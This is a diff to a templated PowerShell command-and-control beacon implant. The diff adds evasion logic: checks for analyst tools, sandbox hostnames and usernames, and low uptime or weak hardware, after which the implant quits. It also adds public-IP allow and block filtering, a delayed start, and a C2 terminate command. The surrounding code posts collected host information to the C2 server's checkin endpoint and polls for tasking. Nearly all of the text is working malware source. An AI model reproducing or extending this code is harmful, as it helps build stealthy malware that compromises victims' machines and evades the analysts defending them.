@@ -2,10 +2,109 @@ $C2_URL = "{{C2_URL}}"
 $BEACON_ID = "{{BEACON_ID}}"
 $SLEEP = {{SLEEP}}
 $JITTER = {{JITTER}}
+$ALLOWED_IPS = "{{ALLOWED_IPS}}"
+$BLOCKED_IPS = "{{BLOCKED_IPS}}"
 
 $OS_INFO = [System.Environment]::OSVersion.VersionString + " " + [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture
 
-# Collect host info for registration
+# Sandbox detection
+function Test-Sandbox {
+    $sandboxProcs = @("wireshark","fiddler","procmon","procmon64","procexp","procexp64","x32dbg","x64dbg","ollydbg","windbg","idaq","idaq64","pestudio","sandboxie","sbiectrl","cuckoomon","joeboxcontrol","joeboxserver","dumpcap","httpdebugger","fakenet","apimonitor")
+    $sandboxHosts = @("SANDBOX","CUCKOO","TEQUILA","FVFF1M7J","WILEYPC","INTELPRO","FLAREVM","TPMNOTIFY","REMNUX")
+    $sandboxUsers = @("sandbox","cuckoo","CurrentUser","WDAGUtilityAccount","hapubws","maltest","malnetvm","yfkol","remnux")
+
+    $hn = [System.Environment]::MachineName.ToUpper()
+    $un = [System.Environment]::UserName.ToLower()
+
+    foreach ($p in $sandboxHosts) { if ($hn -eq $p) { return $true } }
+    foreach ($p in $sandboxUsers) { if ($un -eq $p) { return $true } }
+
+    try {
+        $procs = (Get-Process).ProcessName | ForEach-Object { $_.ToLower() }
+        foreach ($sp in $sandboxProcs) { if ($procs -contains $sp) { return $true } }
+    } catch {}
+
+    try {
+        $uptime = [System.Environment]::TickCount64
+        if ($uptime -lt (30 * 60 * 1000)) { return $true }
+    } catch {}
+
+    if ([System.Environment]::ProcessorCount -lt 2) { return $true }
+
+    try {
+        $mem = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
+        if ($mem -lt 2GB) { return $true }
+    } catch {}
+
+    # Check TEMP dir file count
+    try {
+        $tmpFiles = (Get-ChildItem $env:TEMP -ErrorAction SilentlyContinue).Count
+        if ($tmpFiles -lt 10) { return $true }
+    } catch {}
+
+    # Check sandbox services
+    try {
+        foreach ($svc in @("SbieSvc","CuckooMon","Joeboxserver","cmdvirth")) {
+            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
+            if ($s -and $s.Status -eq "Running") { return $true }
+        }
+    } catch {}
+
+    return $false
+}
+
+function Test-IPFilter {
+    if (-not $ALLOWED_IPS -and -not $BLOCKED_IPS) { return $true }
+    try {
+        $publicIP = (Invoke-WebRequest -Uri "http://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
+    } catch {
+        try { $publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 5).Content.Trim() }
+        catch { return $true }
+    }
+    $ip = [System.Net.IPAddress]::Parse($publicIP)
+    if ($BLOCKED_IPS) {
+        foreach ($entry in $BLOCKED_IPS.Split("|")) {
+            $entry = $entry.Trim()
+            if (-not $entry) { continue }
+            if ($entry -match "/") {
+                $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
+                $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
+                $match = $true; $bits = $prefix
+                for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
+                    $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
+                    if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
+                    $bits -= 8
+                }
+                if ($match) { return $false }
+            } elseif ($publicIP -eq $entry) { return $false }
+        }
+    }
+    if ($ALLOWED_IPS) {
+        foreach ($entry in $ALLOWED_IPS.Split("|")) {
+            $entry = $entry.Trim()
+            if (-not $entry) { continue }
+            if ($entry -match "/") {
+                $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
+                $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
+                $match = $true; $bits = $prefix
+                for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
+                    $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
+                    if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
+                    $bits -= 8
+                }
+                if ($match) { return $true }
+            } elseif ($publicIP -eq $entry) { return $true }
+        }
+        return $false
+    }
+    return $true
+}
+
+Start-Sleep -Seconds 10
+if (Test-Sandbox) { exit }
+if (-not (Test-IPFilter)) { exit }
+
+
 function Get-HostInfo {
     $info = @{
         beacon_id    = $BEACON_ID
@@ -26,7 +125,8 @@ function Get-HostInfo {
 function Register-Beacon {
     try {
         $Body = Get-HostInfo | ConvertTo-Json -Depth 3
-        Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
+        $Resp = Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
+        if ($Resp -eq "__TERMINATE__") { exit }
     } catch {}
 }
 
@@ -93,6 +193,9 @@ while ($true) {
     $Data = Get-CheckIn
 
     if ($Data) {
+        if ($Data -is [string] -and $Data -eq "__TERMINATE__") {
+            exit
+        }
         if ($Data -is [string] -and $Data.StartsWith("SLEEP ")) {
             $Parts = $Data.Split(" ")
             if ($Parts.Length -ge 3) {
